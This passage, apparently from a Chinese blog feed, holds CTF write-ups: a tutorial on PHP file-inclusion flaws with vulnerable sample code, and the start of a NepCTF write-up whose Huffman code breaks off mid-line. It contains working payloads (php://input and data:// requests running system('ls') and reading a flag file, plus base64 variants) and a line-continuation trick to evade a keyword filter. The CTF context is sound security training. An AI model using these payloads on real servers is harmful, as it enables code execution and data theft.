远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但 RFI 的利用条件较为苛刻，需要 php.ini 中进行配置</p>\n<pre><code>allow_url_fopen = On\nallow_url_include = On\n</code></pre>\n<p>两个配置选项均需要为 On，才能远程包含文件成功。<br>\n在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</blockquote>\n<blockquote>\n<p>二、文件包含漏洞原理</p>\n<p>本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。</p>\n<p>服务器执行 PHP 文件时，可以通过文件包含函数加载另一个文件中的 PHP 代码，并且当 PHP 来执行，这会为开发者节省大量的时间。</p>\n<p>这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>\n<p>LFI 产生的原因是由于程序员未对用户可控变量进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。<br>\n如若攻击者能够通过其他方式在 Web 服务器上放置代码，那么他们便可以执行任意命令</p>\n</blockquote>\n<blockquote>\n<p>三、文件包含函数</p>\n<p>PHP 中文件包含函数有以下四种：</p>\n<p>require () // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>\n<p>require_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include () // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>\n<p>include_once () // 如果一个文件已经被包含过，则不会在包含它</p>\n<p>include 和 require 区别主要是，include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>\n而 require 函数出现错误的时候，会直接报错并退出程序的执行。</p>\n<p>而 include_once ()，require_once () 这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>\n<p>这四个函数可以将任意类型的文件当做 PHP 文件进行解析。<br>\n示例代码：</p>\n   <?php\n       $filename  = $_GET['filename']; // 存在可控变量\n       include($filename); // 存在动态变量\n   ?>\n<p>例如：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy=\"false\">[</mo><mtext>‘</mtext><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mtext>’</mtext><mo stretchy=\"false\">]</mo><mtext>参数开发者没有经过严格的过滤，直接带入了</mtext><mi>i</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>u</mi><mi>d</mi><mi>e</mi><mtext>的函数，攻击者可以修改</mtext></mrow><annotation encoding=\"application/x-tex\">_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，\n攻击者可以修改\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">[</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">’</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">开</span><span class=\"mord cjk_fallback\">发</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">严</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">滤</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">直</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">带</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">攻</span><span class=\"mord cjk_fallback\">击</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">改</span></span></span></span>_GET [‘filename’] 的值，执行非预期的操作。</p>\n</blockquote>\n<ul>\n<li>【file:// 协议】</li>\n</ul>\n<blockquote>\n<p>file:// 协议在双 off 的情况下也可以正常使用；</p>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p>file:// 用于访问本地文件系统，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p>\n<p>使用方法：</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<ul>\n<li>【php:// 协议】</li>\n</ul>\n<blockquote>\n<p>条件：</p>\n<p>不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p>\n<p>php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。</p>\n</blockquote>\n<ul>\n<li>【data:// 协议】</li>\n</ul>\n<blockquote>\n<p>经过测试官方文档上存在一处问题，经过测试 PHP 版本 5.2，5.3，5.5，7.0；data:// 协议是是受限于 allow_url_fopen 的，官方文档上给出的是 NO，所以要使用 data:// 协议需要满足双 on 条件</p>\n<p>例子：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=\">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>\n<p>or</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==\">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>\n</blockquote>\n<p><img data-src=\"/img/webpic/713e77b23fb645afa92fb923eda7ac77.png\" alt=\"img\"></p>\n<ol>\n<li>方法一：</li>\n</ol>\n<p>php 协议：</p>\n<p><img data-src=\"/img/webpic/image-20230824233946558.png\" alt=\"image-20230824233946558\"></p>\n<p>只能用 burp 不能用 harkbar 有点奇怪</p>\n<p>请求包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?page=PhP://input</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">61.147.171.105:64567</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">21</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;?php system(\"ls\");?></pre></td></tr></table></figure><p>有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824234142386.png\" alt=\"image-20230824234142386\"></p>\n<p>得到 flag</p>\n<ol start=\"2\">\n<li>方法二：</li>\n</ol>\n<p><img data-src=\"/img/webpic/image-20230824235157008.png\" alt=\"image-20230824235157008\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"ls\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //推荐</span></span></pre></td></tr></table></figure><p>都可以</p>\n<p><img data-src=\"/img/webpic/image-20230824235301184.png\" alt=\"image-20230824235301184\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"cat fl4gisisish3r3.php\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //推荐</span></span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/13/Nep-wp/",
            "url": "http://example.com/2023/08/13/Nep-wp/",
            "title": "Nep__wp",
            "date_published": "2023-08-13T13:28:56.000Z",
            "content_html": "<h1 id=\"nepctf-wp\"><a class=\"markdownIt-Anchor\" href=\"#nepctf-wp\">#</a> NepCTF   wp</h1>\n<p>第一次大型比赛，得到这个成绩也不错了。</p>\n<p><img data-src=\"/img/wp/image-20230813204701517.png\" alt=\"image-20230813204701517\"></p>\n<blockquote>\n<p>{ = 空格</p>\n</blockquote>\n<h2 id=\"1-misc\"><a class=\"markdownIt-Anchor\" href=\"#1-misc\">#</a> 1. misc:</h2>\n<h4 id=\"1codes\"><a class=\"markdownIt-Anchor\" href=\"#1codes\">#</a> 1.codes:</h4>\n<pre><code>环境env要\nen\\\nv绕过下\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>en\\</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>viron<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>en\\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> en\\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/1.png\" alt=\"\"></p>\n<h4 id=\"2与ai共舞的哈夫曼\"><a class=\"markdownIt-Anchor\" href=\"#2与ai共舞的哈夫曼\">#</a> 2. 与 AI 共舞的哈夫曼</h4>\n<p><u>这就是 hint 嘛，年轻人就要年轻，正经人谁自己写代码</u></p>\n<p>AI 代码放进去，自己给 嘻嘻</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> heapq</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">HuffmanNode</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>char <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__lt__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>freq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_codes</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">,</span> current_code<span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> node <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>char <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        huffman_codes<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>char<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> current_code</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> byte <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    root <span class=\"token operator\">=</span> build_huffman_tree<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    compressed_data <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        compressed_data <span class=\"token operator\">+=</span> huffman_codes<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    compressed_data <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> padding</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\"># Write frequency information</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> freq <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># Write compressed data</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            byte <span class=\"token operator\">=</span> compressed_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token 